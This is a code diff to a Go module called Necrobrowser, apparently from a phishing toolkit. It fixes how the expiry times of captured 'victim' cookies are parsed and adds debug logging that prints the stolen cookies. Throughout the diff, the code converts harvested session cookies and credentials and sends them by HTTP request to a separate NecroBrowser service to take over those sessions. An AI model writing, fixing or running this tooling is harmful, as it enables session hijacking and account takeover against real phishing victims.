@@ -108,12 +108,14 @@ func Load(s *session.Session) (m *Necrobrowser, err error) {
 func (module *Necrobrowser) Instrument(cookieJar []db.VictimCookie, credentialsJSON string) {
 
 	var necroCookies []SessionCookie
-	const timeLayout = "2006-Jan-02 00:00:00 +0000 UTC"
+	const timeLayout = "2006-01-02 15:04:05 -0700 MST"
+
 	for _, c := range cookieJar {
 
-		time, err := time.Parse(timeLayout, c.Expires)
+		log.Debug("trying to parse  %s  with layout  %s", c.Expires, timeLayout)
+		t, err := time.Parse(timeLayout, c.Expires)
 		if err != nil {
-			log.Warning("warning: cant's parse Expires field of cookie %s. skipping cookie", c.Name)
+			log.Warning("warning: cant's parse Expires field (%s) of cookie %s. skipping cookie", c.Expires, c.Name)
 			continue
 		}
 
@@ -121,11 +123,11 @@ func (module *Necrobrowser) Instrument(cookieJar []db.VictimCookie, credentialsJ
 			Name:     c.Name,
 			Value:    c.Value,
 			Domain:   c.Domain,
-			Expires:  time.Unix(),
+			Expires:  t.Unix(),
 			Path:     c.Path,
 			HTTPOnly: c.HTTPOnly,
 			Secure:   c.Secure,
-			Session:  time.Unix() < 1,
+			Session:  t.Unix() < 1,
 		}
 
 		necroCookies = append(necroCookies, nc)
@@ -140,6 +142,8 @@ func (module *Necrobrowser) Instrument(cookieJar []db.VictimCookie, credentialsJ
 	cookiesJSON := string(c)
 	module.Request = strings.ReplaceAll(module.Request, CookiePlaceholder, cookiesJSON)
 	module.Request = strings.ReplaceAll(module.Request, CredentialsPlaceholder, credentialsJSON)
+
+	log.Debug(" Sending to NecroBrowser cookies:\n%v", cookiesJSON)
 
 	client := resty.New()
 	resp, err := client.R().
